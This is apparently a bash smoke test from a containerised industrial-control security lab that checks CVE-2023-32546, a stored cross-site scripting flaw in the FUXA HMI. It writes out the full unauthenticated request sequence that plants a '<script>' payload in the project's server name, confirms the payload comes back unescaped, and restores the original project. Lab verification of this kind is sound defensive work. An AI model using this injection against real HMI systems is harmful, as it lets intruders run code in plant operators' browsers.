#!/usr/bin/env bash
# CVE-2023-32546. FUXA 1.1.7's /api/project accepts arbitrary content in
# server-name and view fields and serves it back to the operator's
# browser through the editor and runtime dashboards without escaping. A
# visitor who reaches :1881 (no auth needed) can stash a <script> payload
# in the project; the next operator who opens the dashboard runs it under
# the HMI origin.
#
# Coverage:
#   Stage 1  :1881 reachable from eng-ws, original project captured
#   Stage 2  POST /api/project with <script> payload in server.name
#   Stage 3  GET /api/project returns the payload byte-for-byte
#   Stage 4  cleanup, restore the original project
#   Stage 5  GET /api/project shows the original server.name again
#
# Usage: bash tests/smoke/test_fuxa_stored_xss.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ENG_WS="engineering-workstation"
FUXA_IP="10.10.3.10"
FUXA_PORT=1881
PAYLOAD='<script>fetch("/api/users")</script>'

require_running "$ENG_WS"
require_running "hmi_main"

echo "[fuxa-xss] Stage 0: FUXA :$FUXA_PORT reachable, capture original project"
if ! wait_for_port "$ENG_WS" "$FUXA_IP" "$FUXA_PORT" 10; then
    echo "  [skip] FUXA :$FUXA_PORT not reachable; lab needs './ctl down && ./ctl up'."
    exit 2
fi
ORIG="$(in_container "$ENG_WS" curl -s "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_contains "$ORIG" '"server"' "original project pulled"

echo "[fuxa-xss] Stage 2: inject <script> payload into server.name"
# Build a poisoned project by string-rewriting server.name. Python on the
# attacker side handles JSON properly without quoting battles through the
# eng-ws facade.
POISONED="$(docker exec attacker-machine /opt/attacker-env/bin/python3 -c "
import json, sys
orig = '''$ORIG'''
p = json.loads(orig)
p['server']['name'] = '''$PAYLOAD UUPL'''
print(json.dumps(p))
")"
# POST via curl on eng-ws. The body comes from a temp file to avoid
# bash quoting through the SSH/facade hop.
TMP="/tmp/fuxa_xss_$$.json"
docker exec "$ENG_WS" sh -c "cat > $TMP" <<EOF
$POISONED
EOF
POST_RC="$(in_container "$ENG_WS" curl -s -o /dev/null -w '%{http_code}' \
    -X POST -H 'Content-Type: application/json' \
    --data-binary "@$TMP" \
    "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_contains "$POST_RC" "200" "POST /api/project returned 200"

echo "[fuxa-xss] Stage 3: GET /api/project echoes the payload unescaped"
READBACK="$(in_container "$ENG_WS" curl -s "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_contains "$READBACK" "$PAYLOAD" "stored <script> payload returned byte-for-byte"
assert_absent  "$READBACK" "&lt;script&gt;" "no HTML-escape applied to the script tag"

echo "[fuxa-xss] Stage 4: restore the original project"
docker exec "$ENG_WS" sh -c "cat > $TMP" <<EOF
$ORIG
EOF
in_container "$ENG_WS" curl -s -X POST \
    -H 'Content-Type: application/json' \
    --data-binary "@$TMP" \
    "http://$FUXA_IP:$FUXA_PORT/api/project" >/dev/null
docker exec "$ENG_WS" rm -f "$TMP" >/dev/null 2>&1 || true

echo "[fuxa-xss] Stage 5: project restored"
FINAL="$(in_container "$ENG_WS" curl -s "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_absent "$FINAL" "$PAYLOAD" "payload no longer present in project"

summary
